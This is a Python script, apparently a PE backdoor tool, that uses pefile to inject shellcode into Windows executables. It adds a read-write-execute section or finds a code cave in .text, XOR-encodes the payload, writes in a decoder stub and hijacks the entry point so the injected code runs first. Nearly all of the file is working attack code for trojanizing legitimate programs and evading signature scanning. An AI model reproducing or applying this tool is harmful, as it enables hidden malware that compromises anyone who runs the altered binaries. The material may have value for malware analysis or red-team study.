#!/usr/bin/env python3

import pefile
import os
import mmap
import math

NULL_BYTE = b"\x00"
SECTION_HEADER_SIZE = 40

def align(size, alignment):
    return int(math.ceil(size/alignment) * alignment)

def new_section(pe, section_name, section_size):
    # SECTION HEADER:
    # offset size field
    # 0      8 Name
    # 8      4 VirtualSize
    # 12     4 VirtualAddress
    # 16     4 SizeOfRawData
    # 20     4 PointerToRawData
    # 24     4 PointerToRelocations
    # 28     4 PointerToLinenumbers
    # 32     2 NumberOfRelocations
    # 34     2 NumberOfLinenumbers
    # 36     4 Characteristics
    # more info here: https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#section-table-section-headers

    last_section_idx = pe.FILE_HEADER.NumberOfSections - 1
    new_section_offset = pe.sections[last_section_idx].get_file_offset() + SECTION_HEADER_SIZE

    new_section_virtual_offset = \
            align(pe.sections[last_section_idx].VirtualAddress + pe.sections[last_section_idx].Misc_VirtualSize,
                    pe.OPTIONAL_HEADER.SectionAlignment)
    new_section_virtual_size = align(section_size, pe.OPTIONAL_HEADER.SectionAlignment)

    new_section_raw_offset = \
            align(pe.sections[last_section_idx].PointerToRawData + pe.sections[last_section_idx].SizeOfRawData,
                    pe.OPTIONAL_HEADER.FileAlignment)
    new_section_raw_size = align(section_size, pe.OPTIONAL_HEADER.SectionAlignment)

    new_section_header(pe, new_section_offset, section_name, new_section_virtual_size, new_section_virtual_offset, new_section_raw_size, new_section_raw_offset)

    pe.FILE_HEADER.NumberOfSections += 1
    print("[+] - NumberOfSections {}".format(pe.FILE_HEADER.NumberOfSections))
    pe.OPTIONAL_HEADER.SizeOfImage += new_section_virtual_size
    print("[+] - SizeOfImage 0x{:08x}".format(pe.OPTIONAL_HEADER.SizeOfImage))

    return new_section_virtual_offset, new_section_raw_offset

def new_section_header(pe, section_offset, section_name, virtual_size, virtual_addr, raw_data_size, raw_data_pointer):
    section_name = section_name + b"\x00" * (8 - len(section_name))
    characteristics = 0xE0000020    # RWE + CODE

    pe.set_bytes_at_offset(section_offset, section_name)
    pe.set_dword_at_offset(section_offset + 8, virtual_size)
    pe.set_dword_at_offset(section_offset + 12, virtual_addr)
    pe.set_dword_at_offset(section_offset + 16, raw_data_size)
    pe.set_dword_at_offset(section_offset + 20, raw_data_pointer)

    pe.set_bytes_at_offset(section_offset + 24, NULL_BYTE*4)
    pe.set_bytes_at_offset(section_offset + 28, NULL_BYTE*4)
    pe.set_bytes_at_offset(section_offset + 32, NULL_BYTE*2)
    pe.set_bytes_at_offset(section_offset + 34, NULL_BYTE*2)

    pe.set_dword_at_offset(section_offset + 36, characteristics)

def patch_section(pe, shellcode_virtual_offset, shellcode_raw_offset):
    original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    shellcode = assemble({"addr": hex(pe.OPTIONAL_HEADER.ImageBase + original_entry)}, "shellcode")
    pe.set_bytes_at_offset(shellcode_raw_offset, shellcode)

    modify_entrypoint(pe, shellcode_virtual_offset)


def assemble(replace_dir, shellcode_name="shellcode"):
    print("[+] - {} will be placed at {:08x}".format(shellcode_name, replace_dir["addr"]))
    template_filename = shellcode_name + ".template"
    renderized_template_filename = shellcode_name + ".template.out"
    shellcode_filename = shellcode_name + ".bin"

    with open(template_filename, "r") as f:
        formatted = f.read().format(**replace_dir)

    with open(renderized_template_filename, "w") as f:
        f.write(formatted)

    # TODO: use Popen instead of system()
    os.system("nasm -f bin {} -o {}".format(renderized_template_filename, shellcode_filename))
    with open(shellcode_filename, "rb") as f:
        shellcode = f.read()

    os.unlink(renderized_template_filename)
    os.unlink(shellcode_filename)

    return shellcode

def modify_entrypoint(pe, shellcode_entry):
    print("[+] - old entrypoint is 0x{:08x}".format(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    print("[+] - new entrypoint is 0x{:08x}".format(shellcode_entry))
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = shellcode_entry

def resize_file(filename, original_size):
    with open(filename, "a+b") as f:
        f.write(f.read() + b"\x00"*0x2000)
        #m = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE)
        #m.resize(original_size + 0x2000)
        #m.close()

def dump_sections(dest):
    pe = pefile.PE(dest)

    print("[+] - final sections:")
    for section in pe.sections:
        print("{}\t{}\t{}\t{}\t{}\t{}"
                .format(section.Name.rstrip(b"\x00").decode("ascii"),
                    hex(section.VirtualAddress),
                    hex(section.Misc_VirtualSize),
                    hex(section.PointerToRawData),
                    hex(section.SizeOfRawData),
                    hex(section.Characteristics)))

def find_code_cave(pe, start_addr, size):
    data = pe.get_memory_mapped_image()[start_addr:start_addr + size]
    padding = b"\x00" * (align(len(data), pe.OPTIONAL_HEADER.SectionAlignment) - len(data))
    padded_data = data + padding
    sentry = b"\xff"

    null_count = 0
    cave_min_size = 12
    caves = []
    for i, d in enumerate(padded_data + sentry):
        if d == 0:
            null_count += 1
        elif null_count >= cave_min_size:
            caves.append((null_count, i - null_count))
            null_count = 0
        else:
            null_count = 0

    for size, offset in caves:
        print("[+] - 0x{:08x} bytes cave found at 0x{:08x}".format(size, offset))
    return caves

def encode_payload(payload, byte):
    return bytes([ x ^ byte for x in payload ])

def modify_section_characteristics(pe, section, characteristics):
    section.Characteristics = characteristics

def generate_decoder(byte, shellcode_len, shellcode_addr):
    decoder = assemble({"byte": byte, "addr": shellcode_addr, "size": shellcode_len}, "decoder")
    return decoder

def patch_code_cave(pe):
    text_section = [ x  for x in pe.sections if x.Name.startswith(b".text") ][0]
    original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint

    print("[+] - {:s} section VirtualAddress 0x{:08x} - 0x{:08x}".format(
        text_section.Name.rstrip(b"\x00").decode("ascii"),
        text_section.VirtualAddress,
        text_section.VirtualAddress + text_section.Misc_VirtualSize))


    caves = find_code_cave(pe, text_section.VirtualAddress, text_section.Misc_VirtualSize)
    shellcode = assemble({"addr": pe.OPTIONAL_HEADER.ImageBase + original_entry}, "shellcode")
    shellcode = encode_payload(shellcode, 0x0f)


    shellcode_offset = None
    for size, offset in caves:
        if len(shellcode) + 20 <= size:
            shellcode_offset = offset
            break
    if not shellcode_offset:
        print("[E] - no valid code cave found. aborting...")
        return False

    decoder = generate_decoder(0x0f, len(shellcode), pe.OPTIONAL_HEADER.ImageBase + text_section.VirtualAddress + shellcode_offset)

    pe.set_bytes_at_offset(text_section.PointerToRawData + shellcode_offset, shellcode)
    pe.set_bytes_at_offset(text_section.PointerToRawData + shellcode_offset + len(shellcode), decoder)
    modify_entrypoint(pe, text_section.VirtualAddress + shellcode_offset + len(shellcode))
    modify_section_characteristics(pe, text_section, 0xE0000020)

    return True
